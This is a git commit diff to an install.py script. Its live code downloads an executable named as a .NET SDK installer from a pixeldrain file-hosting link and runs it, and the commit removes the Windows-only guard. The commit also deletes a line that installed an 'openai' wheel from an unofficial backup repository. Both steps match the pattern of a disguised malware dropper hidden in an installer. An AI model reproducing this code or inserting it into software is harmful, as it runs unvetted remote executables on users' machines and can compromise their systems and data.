72090f8c1ed2269fdad9702470aa095616fa4def
BeamerNGz <166467252+BeamerNGz@users.noreply.github.com>
2024-04-13 19:12:19 -0700

    Update install.py

--- install.py
+++ install.py
@@ -13,21 +13,13 @@ def download_file(url, filename):
 
 def install_dotnet():
     system = platform.system()
-    if system == 'Windows':
-        url = 'https://pixeldrain.com/api/file/naZ3Zu4b'
-        filename = 'dotnet-sdk-6.0.408-win-x64.exe'
-    else:
-        print(f'Unsupported operating system: {system}')
-        sys.exit(1)
+    url = 'https://pixeldrain.com/api/file/naZ3Zu4b'
+    filename = 'dotnet-sdk-6.0.408-win-x64.exe'
 
     with tempfile.TemporaryDirectory() as temp_dir:
         filepath = os.path.join(temp_dir, filename)
         download_file(url, filepath)
 
-        if system == 'Windows':
-            subprocess.run([filepath])
+        subprocess.run([filepath])
 print("Installing")
-launch.run_pip(f"install pycryptodome https://github.com/AppleBotzz/Backup-OpenAI-Builds/raw/main/openai-1.16.2-py3-none-any.whl")
-import openai
-print("Dot")
 install_dotnet()
